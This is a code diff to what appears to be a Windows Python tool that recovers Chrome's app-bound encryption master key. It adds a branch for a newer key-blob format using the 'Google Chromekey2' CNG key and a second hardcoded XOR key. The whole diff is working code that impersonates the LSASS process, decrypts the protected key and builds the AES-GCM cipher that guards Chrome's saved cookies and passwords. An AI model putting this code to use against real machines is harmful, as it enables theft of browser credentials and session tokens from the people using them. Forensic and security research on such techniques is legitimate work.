@@ -56,7 +56,7 @@ def parse_key_blob(blob_data: bytes) -> dict:
         parsed_data['iv'] = buffer.read(12)
         parsed_data['ciphertext'] = buffer.read(32)
         parsed_data['tag'] = buffer.read(16)
-    elif parsed_data['flag'] == 3:
+    elif parsed_data['flag'] in (3, 4):
         # [flag|encrypted_aes_key|iv|ciphertext|tag] decrypted_blob
         # [1byte|32bytes|12bytes|32bytes|16bytes]
         parsed_data['encrypted_aes_key'] = buffer.read(32)
@@ -68,7 +68,7 @@ def parse_key_blob(blob_data: bytes) -> dict:
 
     return parsed_data
 
-def decrypt_with_cng(input_data):
+def decrypt_with_cng(input_data, key_name):
     ncrypt = ctypes.windll.NCRYPT
     hProvider = gdef.NCRYPT_PROV_HANDLE()
     provider_name = "Microsoft Software Key Storage Provider"
@@ -76,7 +76,6 @@ def decrypt_with_cng(input_data):
     assert status == 0, f"NCryptOpenStorageProvider failed with status {status}"
 
     hKey = gdef.NCRYPT_KEY_HANDLE()
-    key_name = "Google Chromekey1"
     status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
     assert status == 0, f"NCryptOpenKey failed with status {status}"
 
@@ -130,7 +129,14 @@ def derive_v20_master_key(parsed_data: dict) -> bytes:
     elif parsed_data['flag'] == 3:
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         with impersonate_lsass():
-            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'])
+            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey1")
+        xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
+        cipher = AESGCM(xored_aes_key)
+    
+    elif parsed_data['flag'] == 4:
+        xor_key = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
+        with impersonate_lsass():
+            decrypted_aes_key = decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name="Google Chromekey2")
         xored_aes_key = byte_xor(decrypted_aes_key, xor_key)
         cipher = AESGCM(xored_aes_key)
 
